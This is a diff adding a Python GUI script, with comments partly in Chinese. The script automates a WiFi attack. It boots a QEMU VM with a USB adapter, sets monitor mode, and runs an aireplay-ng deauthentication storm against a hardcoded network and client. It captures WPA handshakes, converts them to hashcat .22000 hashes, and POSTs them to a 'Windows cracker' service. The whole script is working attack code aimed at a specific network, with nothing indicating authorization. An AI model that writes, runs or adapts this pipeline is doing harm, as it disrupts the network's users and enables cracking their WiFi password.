@@ -1,0 +1,247 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Mac WiFi Capture App (double-click GUI)
+========================================
+Pipeline: launch QEMU (Alpine qcow2 + custom initramfs + DWA-160 USB)
+          -> wait for boot + firmware load
+          -> SSH into VM, set wlan0 monitor mode
+          -> airodump-ng + aireplay-ng deauth storm (target SSID/BSSID/ch)
+          -> hcxpcapngtool -> .22000 hash
+          -> POST hash to Windows cracker (port 8766)
+No terminal interaction required (this GUI drives everything).
+"""
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
+import subprocess
+import threading
+import time
+import json
+import urllib.request
+import os
+
+# ---------- fixed QEMU / VM paths (on the Mac) ----------
+QEMU_BIN    = '/opt/homebrew/bin/qemu-system-aarch64'
+QCOW2       = '/tmp/alpine-root.qcow2'
+KERNEL      = '/tmp/alpine-boot/boot/vmlinuz-lts'
+INITRD      = '/tmp/initramfs-custom'
+SERIAL_LOG  = '/tmp/vm_app_serial.log'
+MON_SOCK    = '/tmp/vm_app_monitor.sock'
+SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')
+
+# ---------- defaults (32H10F) ----------
+DEFAULTS = {
+    'ssid':       '32H10F',
+    'bssid':      'BC:3E:07:01:DC:98',
+    'channel':    '1',
+    'client':     'BC:61:93:23:BC:3F',
+    'duration':   '300',            # capture window in seconds
+    'windows_ip': '192.168.1.107',
+    'port':       '8766',
+}
+VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
+          '-o BatchMode=yes root@127.0.0.1' % SSH_KEY)
+
+
+class MacCaptureApp:
+    def __init__(self, root):
+        self.root = root
+        root.title('Mac WiFi Capture  (DWA-160  →  32H10F)')
+        root.geometry('760x560')
+        self.var = {}
+
+        tk.Label(root, text='Target', font=('', 13, 'bold')).grid(
+            row=0, column=0, sticky='w', padx=12, pady=(8, 2))
+        fields = [('ssid', 'SSID'), ('bssid', 'BSSID'),
+                  ('channel', 'Channel'), ('client', 'Client MAC (deauth 目標)')]
+        r = 1
+        for key, label in fields:
+            tk.Label(root, text=label).grid(row=r, column=0, sticky='e', padx=12, pady=3)
+            self.var[key] = tk.StringVar(value=DEFAULTS[key])
+            tk.Entry(root, textvariable=self.var[key], width=30).grid(
+                row=r, column=1, sticky='w', pady=3)
+            r += 1
+        tk.Label(root, text='Capture 秒數').grid(row=r, column=0, sticky='e', padx=12, pady=3)
+        self.var['duration'] = tk.StringVar(value=DEFAULTS['duration'])
+        tk.Entry(root, textvariable=self.var['duration'], width=12).grid(row=r, column=1, sticky='w', pady=3)
+        r += 1
+        tk.Label(root, text='Windows cracker IP').grid(row=r, column=0, sticky='e', padx=12, pady=3)
+        self.var['windows_ip'] = tk.StringVar(value=DEFAULTS['windows_ip'])
+        tk.Entry(root, textvariable=self.var['windows_ip'], width=18).grid(row=r, column=1, sticky='w', pady=3)
+        r += 1
+        tk.Label(root, text='Port').grid(row=r, column=0, sticky='e', padx=12, pady=3)
+        self.var['port'] = tk.StringVar(value=DEFAULTS['port'])
+        tk.Entry(root, textvariable=self.var['port'], width=12).grid(row=r, column=1, sticky='w', pady=3)
+        r += 1
+
+        self.btn = tk.Button(root, text='▶  開始抓包', command=self.start, font=('', 12, 'bold'))
+        self.btn.grid(row=r, column=0, columnspan=2, pady=10, padx=50)
+
+        tk.Label(root, text='Log', font=('', 11, 'bold')).grid(
+            row=r + 1, column=0, columnspan=2, sticky='w', padx=12)
+        self.log = scrolledtext.ScrolledText(root, height=16, width=84)
+        self.log.grid(row=r + 2, column=0, columnspan=2, padx=12, pady=8)
+        self.logline('就緒。確認 DWA-160 已插上 Mac，Windows cracker app 已開。')
+
+    # ---- helpers ----
+    def logline(self, msg):
+        def _append():
+            self.log.insert('end', msg + '\n')
+            self.log.see('end')
+            self.root.update_idletasks()
+        try:
+            self.root.after(0, _append)
+        except Exception:
+            pass
+
+    def start(self):
+        self.btn.config(state='disabled')
+        threading.Thread(target=self.run, daemon=True).start()
+
+    def run(self):
+        try:
+            ssid    = self.var['ssid'].get().strip()
+            bssid   = self.var['bssid'].get().strip().upper()
+            ch      = self.var['channel'].get().strip()
+            client  = self.var['client'].get().strip().upper()
+            dur     = int(self.var['duration'].get().strip() or '300')
+            wip     = self.var['windows_ip'].get().strip()
+            port    = self.var['port'].get().strip()
+            self.logline('=== Mac WiFi Capture: %s (%s) ch%s, %ss ===' % (ssid, bssid, ch, dur))
+
+            # 1. check required files
+            missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
+            if missing:
+                for f in missing:
+                    self.logline('❌ MISSING: %s' % f)
+                self.logline('   /tmp 可能被清掉了 → 重新 build VM，或改用 ~/wifi-vm/。')
+                return
+
+            # 2. kill existing QEMU
+            self.logline('[1/6] 關閉既有 QEMU ...')
+            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
+            time.sleep(2)
+
+            # 3. launch QEMU
+            self.logline('[2/6] 啟動 QEMU (qcow2 + custom initramfs + DWA-160) ...')
+            os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
+            cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
+                   '-drive file=%s,format=qcow2 '
+                   '-kernel %s -initrd %s -append "console=ttyAMA0" '
+                   '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
+                   '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
+                   '-device virtio-net-pci,netdev=n0 '
+                   '-device qemu-xhci,id=xhci '
+                   '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
+                   '-display none -monitor unix:%s,server,nowait'
+                   % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
+            qemu_proc = subprocess.Popen(cmd, shell=True,
+                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.logline('   QEMU PID %s。等 95s 開機 + firmware load (rt2870.bin 延遲 load ~64-80s) ...' % qemu_proc.pid)
+            time.sleep(95)
+
+            # 4. SSH in + capture
+            self.logline('[3/6] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
+            vm_script = (
+                'set +e\n'
+                # 清舊 /tmp 檔 (qcow2 root 小, 舊 airodump.log 172M 會塞滿 → cap 檔寫不進)
+                'rm -f /tmp/capapp* /tmp/appairodump.log /tmp/appdeauth.log /tmp/airodump.log /tmp/deauth.log 2>/dev/null\n'
+                'rm -f /tmp/capfull* /tmp/captest* /tmp/par* /tmp/fg* /tmp/dbg* /tmp/alone* /tmp/mix* /tmp/fresh* 2>/dev/null\n'
+                # 等 firmware load + wlan0 ready (rt2870.bin 延遲 load 64-80s)
+                'i=0\n'
+                'while [ $i -lt 40 ]; do\n'
+                '  if iw dev 2>/dev/null | grep -q wlan0 && dmesg 2>/dev/null | grep -q "Firmware detected"; then break; fi\n'
+                '  sleep 3; i=$((i+1))\n'
+                'done\n'
+                'iw dev wlan0 set type monitor 2>/dev/null\n'
+                'ifconfig wlan0 up 2>&1\n'
+                'sleep 2\n'
+                'pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null\n'
+                'sleep 1\n'
+                'rm -f /tmp/capapp* 2>/dev/null\n'
+                # deauth storm 背景 (nohup &)
+                'nohup aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 > /dev/null 2>&1 &\n'
+                'sleep 3\n'
+                # airodump 迴圈 (每次 airodump 提前退出, 跑多次累積 capture)
+                'nruns=$((%s / 10)); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 30 ] && nruns=30\n'
+                'for i in $(seq 1 $nruns); do\n'
+                '  timeout 10 airodump-ng -w /tmp/capapp -c %s wlan0 > /dev/null 2>&1\n'
+                'done\n'
+                'pkill aireplay-ng 2>/dev/null\n'
+                'echo "CAP_COUNT:"; ls /tmp/capapp-*.cap 2>/dev/null | wc -l\n'
+                'echo "CAP_TOTAL:"; du -sch /tmp/capapp-*.cap 2>/dev/null | tail -1\n'
+                'ls /tmp/capapp-*.cap 2>/dev/null | xargs hcxpcapngtool -o /tmp/capapp.22000 2>&1 | tail -3\n'
+                'echo "===HASH==="\n'
+                'cat /tmp/capapp.22000 2>/dev/null\n'
+                'echo "===END==="\n'
+                'wc -l /tmp/capapp.22000 2>/dev/null\n'
+                % (bssid, client, dur, ch)
+            )
+            r = subprocess.run(VM_SSH + ' "sh -s"', input=vm_script.encode(),
+                               capture_output=True, timeout=dur + 200, shell=True)
+            out = (r.stdout or b'').decode('utf-8', 'replace') + (r.stderr or b'').decode('utf-8', 'replace')
+            for line in out.splitlines():
+                if any(k in line for k in ['===HASH===', '===END===', 'WPA', 'PMKID',
+                                           'EAPOL', 'hcxpcapngtool', 'packets inside',
+                                           'ESSID', 'ioctl', 'Failed', 'CAP_COUNT',
+                                           'CAP_TOTAL', 'processed cap files']):
+                    self.logline('   ' + line.strip())
+
+            # extract hash lines
+            hash_lines, in_hash = [], False
+            for line in out.splitlines():
+                if '===HASH===' in line:
+                    in_hash = True
+                    continue
+                if '===END===' in line:
+                    in_hash = False
+                    continue
+                if in_hash and line.strip():
+                    hash_lines.append(line.strip())
+            self.logline('[4/6] 抓到 %d 行 hash' % len(hash_lines))
+            for h in hash_lines:
+                self.logline('   HASH: %s' % (h[:64] + ('...' if len(h) > 64 else '')))
+
+            # 5. POST to Windows
+            self.logline('[5/6] POST %d 個 hash 到 Windows %s:%s ...' % (len(hash_lines), wip, port))
+            posted = 0
+            for h in hash_lines:
+                payload = {'hash': h, 'ssid': ssid, 'bssid': bssid.lower()}
+                try:
+                    req = urllib.request.Request(
+                        'http://%s:%s/api/receive-hash' % (wip, port),
+                        data=json.dumps(payload).encode(),
+                        headers={'Content-Type': 'application/json'}, method='POST')
+                    resp = urllib.request.urlopen(req, timeout=15)
+                    body = resp.read().decode('utf-8', 'replace')
+                    self.logline('   POST OK: %s' % body[:120])
+                    posted += 1
+                except Exception as e:
+                    self.logline('   POST FAIL: %s' % e)
+
+            # 6. result
+            self.logline('[6/6] 完成。POST 成功 %d/%d。%s' % (
+                posted, len(hash_lines),
+                '✅ 成功' if posted > 0 else '⚠️ 0 hash（PMKSA timing → 重跑或加大 capture 秒數）'))
+            self.logline('=== 結束 ===')
+        except Exception as e:
+            self.logline('ERROR: %r' % e)
+        finally:
+            self.btn.config(state='normal')
+            # leave QEMU running so user can re-run without re-boot; kill on next start
+
+    def on_close(self):
+        # optional: stop QEMU on close
+        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
+        self.root.destroy()
+
+
+def main():
+    root = tk.Tk()
+    app = MacCaptureApp(root)
+    root.protocol('WM_DELETE_WINDOW', app.on_close)
+    root.mainloop()
+
+
+if __name__ == '__main__':
+    main()
